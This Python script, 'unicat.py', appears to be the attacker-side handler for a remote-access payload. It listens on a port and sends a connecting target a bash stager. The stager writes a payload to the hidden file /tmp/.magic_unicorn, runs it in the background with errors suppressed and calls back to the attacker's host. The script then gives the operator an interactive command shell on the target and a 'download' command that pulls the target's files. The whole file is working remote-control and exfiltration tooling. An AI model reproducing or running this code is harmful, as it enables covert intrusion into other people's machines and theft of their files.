import socket
import sys

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'
G = '\033[1;34m[*] \033[0m'

if len(sys.argv) < 3:
    print("Usage: unicat.py <local_host> <local_port>")
    sys.exit()
    
LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

def craft_payload():
    print(G+"Sending payload...")
    f = open("data/payload/magic_unicorn.py", "rb")
    payload = f.read()
    f.close()
    instructions = \
    "cat >/tmp/.magic_unicorn;"+\
    "chmod +x /tmp/.magic_unicorn;"+\
    "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
    print(G+"Executing payload...")
    return (instructions,payload)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)

# Bind handler works here

print(G+"Binding to "+LHOST+":"+str(LPORT)+"...")
try:
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', LPORT))
    s.listen(1)
except:
    print(E+"Failed to bind to "+LHOST+":"+str(LPORT)+"!")
            
print(G+"Listening on port "+str(LPORT)+"...")
client, addr = sock.accept()    
print(G+"Connecting to "+addr[0]+"...")

bash_stager, executable = craft_payload()

client.send(bash_stager.encode())
client.send(executable)
client.close()
sock.close()

print(G+"Establishing connection...")
client, addr = s.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[2]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    client.send(command)
    data = client.recv(1024).decode("utf-8")
    if data == "exit":
        print(G+"Cleaning up...")
        break
       
    if command.decode("utf-8").split(" ")[0] != "download":
        print(data)
    
client.close()
sock.close()
